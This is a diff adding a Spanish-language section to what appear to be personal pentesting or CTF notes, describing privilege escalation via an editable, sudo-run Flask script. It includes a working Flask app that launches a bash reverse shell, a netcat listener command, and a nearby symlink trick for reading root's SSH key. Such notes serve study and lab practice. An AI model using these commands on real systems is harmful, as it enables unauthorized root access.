@@ -184,3 +184,46 @@ uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
     - ln -s /file/you/want/to/read root.txt
 - Pensar que con esto se puede conseguir `/root/.ssh/id_rsa`
 - [Source](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)
+
+
+## Flask Privilege Escalation
+- Si tenemos un archivo de python editable que corre un servidor Flask, podemos inyectar código malicioso en el archivo para obtener acceso root.
+
+```bash
+
+jack@BitForge:~$ sudo -l
+Matching Defaults entries for jack on bitforge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty, !env_reset
+
+User jack may run the following commands on bitforge:
+    (root) NOPASSWD: /usr/bin/flask_password_changer
+``` 
+
+-----
+
+```python
+from flask import Flask, render_template
+import subprocess
+import os
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    # Comando para iniciar una reverse shell al localhost:9000
+    try:
+        # Usamos /bin/bash para la reverse shell
+        cmd = "/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/9000 0>&1'"
+        subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return render_template("index.html")
+    except Exception as e:
+        return f"Error al iniciar la reverse shell: {str(e)}"
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
+    ``` 
+
+- Ahora si hacemos curl `curl http://localhost:5000/` nos va a dar una reverse shell.
+- `nc -lvnp 9000` y tenemos acceso a la shell.
